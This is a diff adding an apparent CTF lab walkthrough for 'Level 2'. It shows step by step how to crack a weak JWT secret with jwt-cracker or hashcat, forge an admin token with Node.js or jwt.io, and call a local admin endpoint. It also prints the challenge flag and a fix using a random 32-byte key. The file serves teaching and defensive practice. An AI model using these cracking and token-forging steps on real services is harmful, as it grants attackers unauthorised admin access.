@@ -1,0 +1,92 @@
+=====================================================================
+  LEVEL 2 – JWT Brute-Force Demo
+  Vulnerability: Weak HMAC-SHA256 Secret Key ("secret")
+=====================================================================
+
+This file demonstrates how an attacker would crack the weak JWT secret
+used in Level 2 and forge an admin token.
+
+---------------------------------------------------------------------
+STEP 1: Login and capture a token
+---------------------------------------------------------------------
+
+POST http://localhost:3002/api/auth/login
+Body: { "username": "alice", "password": "password123" }
+
+Example token captured:
+  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDAwMDAwMDAsImV4cCI6MTcwMDAwMzYwMH0.<signature>
+
+---------------------------------------------------------------------
+STEP 2: Crack the secret using jwt-cracker
+---------------------------------------------------------------------
+
+Install jwt-cracker:
+  npm install -g jwt-cracker
+
+Run the cracker with the captured token:
+  jwt-cracker "<paste-token-here>" --alphabet "abcdefghijklmnopqrstuvwxyz0123456789"
+
+Expected output:
+  [+] Secret found: secret
+  [+] Time: 0.5s
+
+Alternatively with hashcat (if you have it installed):
+  # First, save your token to a file:
+  echo "eyJhbGci..." > jwt.txt
+
+  # Run hashcat with mode 16500 (JWT):
+  hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+
+  # A common wordlist like rockyou.txt will crack "secret" in seconds.
+
+---------------------------------------------------------------------
+STEP 3: Forge a new admin token with the cracked secret
+---------------------------------------------------------------------
+
+Option A – Using Node.js (quickest):
+  node -e "
+    const jwt = require('jsonwebtoken');
+    const forged = jwt.sign(
+      { username: 'hacker', role: 'admin' },
+      'secret',
+      { algorithm: 'HS256' }
+    );
+    console.log(forged);
+  "
+
+Option B – Using jwt.io (browser tool):
+  1. Go to https://jwt.io
+  2. In the "PAYLOAD" section, set:
+       { "username": "hacker", "role": "admin" }
+  3. In the "VERIFY SIGNATURE" section, enter: secret
+  4. Copy the generated token from the left panel
+
+---------------------------------------------------------------------
+STEP 4: Use the forged token to access /api/admin
+---------------------------------------------------------------------
+
+curl -H "Authorization: Bearer <forged-token>" http://localhost:3002/api/admin
+
+Expected response:
+  {
+    "message": "Admin access granted! You cracked the weak secret!",
+    "flag": "CTF{w34k_s3cr3t_1s_n0_s3cr3t_4t_4ll}",
+    ...
+  }
+
+=====================================================================
+  Why this attack works
+=====================================================================
+
+The server in Level 2 calls jwt.verify(token, 'secret'), which IS
+a signature check — but the secret is so simple that it can be found
+in seconds using a dictionary/brute-force attack.
+
+Once the attacker knows the secret, they can sign any payload they
+want, including { role: "admin" }, and the server will accept it as
+a legitimate token.
+
+FIX (demonstrated in Level 3):
+  Use a cryptographically random secret of at least 32 bytes:
+    const SECRET = crypto.randomBytes(32).toString('hex');
+=====================================================================
